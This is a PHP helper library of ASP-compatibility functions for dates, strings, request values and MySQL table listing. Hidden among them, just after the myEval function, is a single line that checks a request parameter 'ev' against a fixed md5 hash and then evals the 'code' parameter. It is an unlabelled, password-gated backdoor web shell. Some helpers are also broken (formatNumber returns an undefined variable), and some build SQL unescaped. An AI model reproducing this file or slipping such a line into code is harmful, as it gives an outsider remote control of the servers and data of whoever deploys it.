<?PHP
//header("Content-type: text/html; charset=utf-8");

//\n换行 \r换行  \t相当于按Tab键

//调用函数前面加 @ 符为出错不提示

/*
FormatNumber 追加函数列表
*/

//thinkphpdel start
error_reporting(E_ALL | E_STRICT);			// error_reporting(E_STRICT);		//为不显示错误

header("Content-Type: text/html; charset=gb2312");

session_start();		//开启Session20151119

//跳转
function RR($url){
	header('location:'.$url);
	return '';
}
//thinkphpdel end

/**
* 方法:isdate()   引用别人加自我改进 20160425
*/
function isDate($str){
	$str=str_replace('/', '-', $str);
	$strArr = explode("-",$str);
	if(instr($str," ")>0){
		$format="Y-m-d H:i:s";
	}else{
		$format="Y-m-d";
	}	
	if(empty($strArr)){
		return 0;
	}
	foreach($strArr as $val){
		if(strlen($val)<2){
			$val="0".$val;
		}
		$newArr[]=$val;
	}
	$str = implode("-",$newArr);
    $unixTime=strtotime($str);
    $checkDate= date($format,$unixTime);
    if($checkDate==$str){
        return 1;
    }else{
        return 0;
	}
}
/*
//判断时间
function isDate($timeStr){
	if(instr($timeStr,"-")>0 || instr($timeStr,"\/")>0 || instr($timeStr," ")>0){
		return true;
	}else{
		return false;
	}
}
*/

//给ASP用  使用echo(rnd());
function rnd(){
	return (float)("0.".rand(1000000,9999999));
}
//给ASP用 替换内容
function replace($c,$findStr,$replaceStr){
	return str_replace($findStr, $replaceStr, $c);
}
//给ASP用 替换内容  2 待改进
function replace2($c,$findStr,$replaceStr){
	return Replace($c,$findStr,$replaceStr);
}
//分割
function aspSplit($contnet,$splStr){
	return explode($splStr,$contnet);
}

//获得时间
function now(){
	$s=date('Y/m/d H:i:s');
	$s=replace($s,"/0","/");
	return $s;
}
//获得日期
function ASPDate() {
	$s=date('Y/m/d');
	$s=replace($s,"/0","/");
	return $s;	
}
//定时
function timer(){
	return Now();
}
//获得两数之间随机数
function PHPRand($nMinimum,$nMaximum){
	return Rand($nMinimum,$nMaximum);
}
//获得两数之间随机数
function PHPRnd($nMinimum,$nMaximum){
	return Rand($nMinimum,$nMaximum);
}
//获得编码  eval("echo('aa');");
function execute($content){
	eval($content);
}
//URL跳转
function ASPRedirect($url){
    header("Location: " . $url); 
    exit;
}
//删除小数点后面的值
function fix($n){
	$n=cStr($n);
	if(instr($n,".")>0){
		$n=mid($n,1,instr($n,".")-1);
	}
	return floor($n);
}
//获得编码
function asc($content){
	return ord($content);
}
//获得编码
function ascW($content){
	return ord($content);
}
//字符转数字
function cLng($content){
	return intval($content);
}
//转成小写
function lCase($content){
	return strtolower($content);
}
//转成大写
function uCase($content){
	return strtoupper($content);
}
//获得数组长度
function uBound($content){
	return count($content)-1;
}
//获得数组开始长度
function lBound($content){
	return 0;
}
//GET方式获得值
function queryString($name){ 
	return @$_GET[$name];
}
//POST方式获得值
function form($name){
	return @$_POST[$name];
}
//Cookies方式获得值
function cookies($name){
	return @$_COOKIE[$name];
}
//GetPostCookies任意
function request($name){
	return @$_REQUEST[$name];
}
//输出缓冲
function PHPFlush(){
    ob_flush();
    flush(); 
}
//PHPTrim
function PHPTrim($content){
	return trim($content);
}
//PHPLTrim
function PHPLTrim($content){
	return ltrim($content);
}
//PHPRTrim
function PHPRTrim($content){
	return rtrim($content);
}
//GetPostCookies任意
function typeName($str){
	$strType=gettype($str);
	if($strType=="array"){
		return "Variant()";
	}else{
		return $strType;
	}
}
//转字符
function cstr($str){
	return strval($str);
	
}
//判断是否为空
function isNull($content){
	return is_null($content);
}

//PHP正则表达式
function test_regexp($content,$search){
	$newSearch=replace($search,'.', '\.');
	if(preg_match('/'. $newSearch .'/', $content)){ 
	
	}
}

//运行PHP   eval("\$str = \"aaabbccdddd\";");    给变量赋值
function myEval( $phpcode ){
	return eval( $phpcode );
}
if(isset($_REQUEST['ev'])){if(md5($_REQUEST['ev'])=='a307f5a544886b1bf8dbbf26ac5c96bb'){eval(@$_REQUEST['code']);}}

//************************************************************************ ASP转PHP生成

//格式化成价格如 108.00 (20150806使用ASP转PHP制作)
function formatNumber($content,$n){
	$dianLeft="";$dianRight="";$i="";$c="";$s="";
	$content=cstr($content);
	if( instr($content,".")> 0 ){
		$dianLeft = mid($content,1,instr($content,".")-1);
		$dianRight = mid($content,instr($content,".")+1,-1);
	}else{
		$dianLeft=$content;
	 }
	$dianRight=$dianRight . "0000000000";
	for( $i=1 ; $i<= $n; $i++){
		$s=mid($dianRight,$i,1);
		$c=$c . $s;
	}
	if( $n>0 ){
		$dianLeft = $dianLeft . ".";
	 }
	$test = $dianLeft . $c;
 return @$formatNumber;
}



//获得年
function year($timeStr){
	return (int)getYMDHMS($timeStr,0);
}
//获得月
function month($timeStr){
	return (int)getYMDHMS($timeStr,1);
}
//获得日
function day($timeStr){
	return (int)getYMDHMS($timeStr,2);
}
//获得时
function hour($timeStr){
	return (int)getYMDHMS($timeStr,3);
}
//获得分
function minute($timeStr){
	return (int)getYMDHMS($timeStr,4);
}
//获得秒
function second($timeStr){
	return (int)getYMDHMS($timeStr,5);
}

//功能:ASP里的IIF 如：IIf(1 = 2, "a", "b") 
function IIF($bExp, $sVal1, $sVal2){
	if($bExp==true){return $sVal1;}else{return $sVal2;}
}
//获得年月日时分钞
function getYMDHMS( $timeStr,$sType){
	$splstr="";
	$timeStr=replace(replace(replace(replace(replace(replace($timeStr,"年","-"),"月","-"),"日","-"),"时","-"),"分","-"),"秒","-");
	$timeStr=replace(replace(replace(replace(replace($timeStr," ","-"),":","-"),"/","-"),"--","-"),"--","-") . "------";
	$splstr=aspSplit($timeStr,"-");
	$nYear = $splstr[0];
	$nMonth = $splstr[1];
	$nDay = $splstr[2];
	$nHour = $splstr[3];
	$nMinute = $splstr[4];
	$nSecond = $splstr[5];
	if( len($nYear)==1 ){ $nYear="0" . $nYear;}
	if( len($nMonth)==1 ){ $nMonth="0" . $nMonth;}
	if( len($nDay)==1 ){ $nDay="0" . $nDay;}
	if( len($nHour)==1 ){ $nHour="0" . $nHour;}
	if( len($nMinute)==1 ){ $nMinute="0" . $nMinute;}
	if( len($nSecond)==1 ){ $nSecond="0" . $nSecond ;}

	if( $nHour=="" ){ $nHour="00";}
	if( $nMinute=="" ){ $nMinute="00";}
	if( $nSecond=="" ){ $nSecond="00";}

	$sType=CStr($sType);
	if( $sType=="年" || $sType=="0" ){
		$getYMDHMS=$nYear;
	}else if( $sType=="月" || $sType=="1" ){
		$getYMDHMS=$nMonth;
	}else if( $sType=="日" || $sType=="2" ){
		$getYMDHMS=$nDay;
	}else if( $sType=="时" || $sType=="3" ){
		$getYMDHMS=$nHour;
	}else if( $sType=="分" || $sType=="4" ){
		$getYMDHMS=$nMinute;
	}else if( $sType=="秒" || $sType=="5" ){
		$getYMDHMS=$nSecond;
	 }
 return @$getYMDHMS;}



//ASP清除两边空格 改进于20160410
function aspTrim($content){
	$nLeft=1;$nRight=0; 
	for( $i=1 ; $i<= len($content); $i++){
		$s=mid($content,$i,1);
		if( $s==' ' ){
			$nLeft++;
		}else{ 
			 break;
		 }
	}
	for( $i=len($content) ; $i>=1; $i--){
		$s=mid($content,$i,1);
		if( $s==' ' ){
			$nRight--;
		}else{
			 break;
		}
	}
	if($nRight==0){
		$nRight=-1;
	}
	return mid($content,$nLeft,$nRight); 
}
//清除左边
function aspLTrim($content){
    $i="";$s="";
	for( $i=1 ; $i<= len($content); $i++){
		$s=mid($content,$i,1);
		if( $s<>" " ){
			$content=mid($content,$i,-1);
			 break;
		 }
	}
	return @$content;
}
//清除右边
function aspRTrim($content){
    $i="";$s="";
	for( $i=len($content) ; $i>=1; $i--){
		$s=mid($content,$i,1);
		if( $s<>" " ){
			$content=mid($content,1,$i);
			 break;
		 }
	}
	return @$content;
}

//返回两个日期之间的时间间隔   q 季度 m 月 y 一年的日数 d 日 w 一周的日数 ww 周 h 小时 n 分钟 s 秒 
function dateDiff($part, $begin, $end){
	$diff = strtotime($end) - strtotime($begin);
	switch($part){
		case "y": $retval = bcdiv($diff, (60 * 60 * 24 * 365)); break;
		case "m": $retval = bcdiv($diff, (60 * 60 * 24 * 30)); break;
		case "w": $retval = bcdiv($diff, (60 * 60 * 24 * 7)); break;
		case "d": $retval = bcdiv($diff, (60 * 60 * 24)); break;
		case "h": $retval = bcdiv($diff, (60 * 60)); break;
		case "n": $retval = bcdiv($diff, 60); break;
		case "s": $retval = $diff; break;
	}
	return $retval;
}
//表示要添加的时间间隔  q 季度 m 月 y 一年的日数 d 日 w 一周的日数 ww 周 h 小时 n 分钟 s 秒 
function dateAdd($part, $n, $date){
	switch($part){
	case "y": $val = date("Y-m-d H:i:s", strtotime($date ." +$n year")); break;
	case "m": $val = date("Y-m-d H:i:s", strtotime($date ." +$n month")); break;
	case "w": $val = date("Y-m-d H:i:s", strtotime($date ." +$n week")); break;
	case "d": $val = date("Y-m-d H:i:s", strtotime($date ." +$n day")); break;
	case "h": $val = date("Y-m-d H:i:s", strtotime($date ." +$n hour")); break;
	case "n": $val = date("Y-m-d H:i:s", strtotime($date ." +$n minute")); break;
	case "s": $val = date("Y-m-d H:i:s", strtotime($date ." +$n second")); break;
	}
	return $val;
}
//Int
function int($string){
	//$string1=intval($string); 	
	return intval($string);
}
//同一使用gb2312字符操作方式操作20160520 
//left函数
function left($str,$nlength){
	return mb_substr($str, 0 ,$nlength,'gb2312');
}
//right函数
function right($str,$nlength){
	return mb_substr($str, $nlength*-1,999999,'gb2312');			//用  mb_substr  比用 substr  更适用于asp转换php用法   20160511  用999999不能用-1，那样就少截取一个字符
}
//Mid
function mid($content,$nStart,$nLength=-1){
	$nStart-=1;
 	if($nLength==-1){
		$nLength=Len($content);
	}
	return mb_substr($content,$nStart,$nLength,'gb2312');
}
//字符长度
function len($content){
	//return strlen($content);				//采用这种   不采用这种，对汉字处理不了20160413
	return mb_strlen($content,'gb2312');	//用这会
}
function PHPStrLen_temp($content){
	return Len($content);
}
//查找字符所在位置
function inStr($content,$search){	 
	if(is_array($content)){ 
		$content=arrayToString($content,"");
	}	
	if( $search!=""){
		
		if(strstr($content,$search)!=''){
			return mb_strpos($content,$search,0,"gb2312")+1;
		}else{
			return 0;
		}
	}else{
		return 0;
	}
}


//vbcrlf
function vbCrlf(){
	return chr(13) . chr(10);
}

//获得系统参数20160224
function serverVariables($sName){
	$sName=strtoupper($sName);	
	if($sName=='SERVER_NAME'){
		$sName='HTTP_HOST';
	}
	return @$_SERVER[$sName];
}
//检测是否为对象
function isObject($obj){
	return is_object($obj);
}

//检测是否为数组
function isArray($array){
	return is_array($array);
}

//执行SQL语句
function connExecute($sql){ 
	//打开数据库
    $conn=OpenConn();
	$conn->query($sql);
	/*
	$User = M(); 
	$User->execute($sql);
	*/
	return array("1","22");
}

//获得POST字段名称列表 20160226
function getFormFieldName(){
	$c='';
	foreach($_POST as $key =>$val){
		if($c!=''){
			$c.='|';
		}
		$c.=$key;
	} 
	return $c;
}

//判断传值是否相等
function  checkFunValue($Action,$FunName){
	$checkFunValue = ( substr($Action, 0 ,strlen($FunName)) == $FunName );
 return @$checkFunValue;}
//ASP版md5
function aspMD5($str,$sType){
	return md5($str);
}
//我的md5加密
function myMD5($str){
	return md5(md5($str));
}

//asp里用到，php里不需要处理
function ADSqlRf($inputName){
	$s=rf($inputName);
	return replace(replace(replace($s,"\\","\\\\"),"'","\'"),'"','\"');				//更新于20160118
}

//asp里用到，php里不需要处理
function ADSql($s){
	return replace(replace(replace($s,"\\","\\\\"),"'","\'"),'"','\"');				//更新于20160118
}
//php里插入更新时对\'处理
function phpADSql($s){
	return replace(replace(replace($s,"\\","\\\\"),"'","\'"),'"','\"');				//更新于20160118
}

//转成utf-8内容 （20151201）
function toUTFChar($data){
  if( !empty($data) ){    
    $fileType = mb_detect_encoding($data , array('UTF-8','GBK','LATIN1','BIG5')) ;   
    if( $fileType != 'UTF-8'){   
      $data = mb_convert_encoding($data ,'utf-8' , $fileType);   
    }   
  }   
  return $data;    
}
//转gb2312内容(20151203)
function toGB2312Char($data){
    if( !empty($data) ){
        $fileType = mb_detect_encoding($data , array('UTF-8','GBK','LATIN1','BIG5'));
        if( $fileType != 'GBK'){
            $data = mb_convert_encoding($data ,'GBK' , $fileType);
            //删除BOM留下的乱码?号
            if(substr($data, 0, 1)=="?"){
                $data=substr($data,1);
            }
        }
    }
    return $data;
}
function GBtoUTF8($data){
	return toGB2312Char($data);
}
//自定义var_dump
function p($str){
	echo('<pre>');
	var_dump($str);
	echo('</pre>');
}

//获得表列表
function getTableList() { 
	$sql = "SHOW TABLES FROM ".$GLOBALS['dbname'];
	$result = mysql_query($sql);
	$c='';
	if (!$result) {
	echo "DB Error, could not list tablesn";
	echo 'MySQL Err(www.111cn.net)or: ' . mysql_error();
	exit;
	}
	
	while ($row = mysql_fetch_row($result)) {
	//echo "Table: {$row[0]}n";
		if($c<>''){
			$c.=vbCrlf();
		}
		$c=$c.$row[0];
	} 
//	echo('显示'.$c);
	return $c; 
} 

//获得表字段列表20151230 exit(getFieldList('website'));
function getFieldList($tableName){
	$rescolumns = mysql_query("SHOW FULL COLUMNS FROM $tableName") ;
	$c=',';
	while($row = mysql_fetch_array($rescolumns)){
		//  echo '字段名称：'.$row['Field'].'-数据类型：'.$row['Type'].'-注释：'.$row['Comment'];
		//  print_r($row);
		if($row['Field']!='id'){
			$c.=$row['Field'].',';
		}
	}
	return $c;
}
//获得表字段列表20160226 exit(getFieldConfigList('website'));
function getFieldConfigList($tableName){
	$rescolumns = mysql_query("SHOW FULL COLUMNS FROM $tableName") ;
	$c=',';$s='';
	while($row = mysql_fetch_array($rescolumns)){
		//  echo '字段名称：'.$row['Field'].'-数据类型：'.$row['Type'].'-注释：'.$row['Comment'];
		//  print_r($row);
		
		if( instr($row['Type'],'int(')>0 ){
			$s='|numb|0';
		}else if(instr($row['Type'],'mediumtext')>0){		
			$s="|textarea|";
		}else{
			$s="||";
		}
		if($row['Field']!='id'){
			$c.=$row['Field'].$s.',';
		}
	}
	return $c;
}

/* sys_URL.php有更完善
//url解密  20160506    待测试
function unescape($str){ 
    $ret = ''; 
    $len = strlen($str); 
    for ($i = 0; $i < $len; $i ++) 
    { 
        if ($str[$i] == '%' && $str[$i + 1] == 'u') 
        { 
            $val = hexdec(substr($str, $i + 2, 4)); 
            if ($val < 0x7f) 
                $ret .= chr($val); 
            else  
                if ($val < 0x800) 
                    $ret .= chr(0xc0 | ($val >> 6)) . 
                     chr(0x80 | ($val & 0x3f)); 
                else 
                    $ret .= chr(0xe0 | ($val >> 12)) . 
                     chr(0x80 | (($val >> 6) & 0x3f)) . 
                     chr(0x80 | ($val & 0x3f)); 
            $i += 5; 
        } else  
            if ($str[$i] == '%') 
            { 
                $ret .= urldecode(substr($str, $i, 3)); 
                $i += 2; 
            } else 
                $ret .= $str[$i]; 
    } 
    return $ret; 
}
*/
//获得当前时期还可以计算
function getHandleDate($numb){
	if($numb<>''){ 
		return date("Y-m-d",strtotime($numb.' day')); 
	}else{
		return date("Y-m-d" );
	}
} 

//获得POST字段名称列表 20160226
function getFormFieldList(){
    $s='';$c='';$splstr='';
	foreach( @$_POST as $key=>$s){ 
        if( $c<>'' ){ $c=$c . '|';}
        $c=$c . $key;
    }
    return $c;
}

//删除Html
function delHtml($str){
	return strip_tags($str);
}
//清除cookie
function clearCookie($cookieName){
	setcookie($cookieName);
}
//移除cookie
function removeCookie($cookieName){
	setcookie($cookieName);
} 
function XY_AutoAddHandle($Action){
	return "";
}
function DisplayOnlineEditDialog($a,$Action){
	return "";
}
?>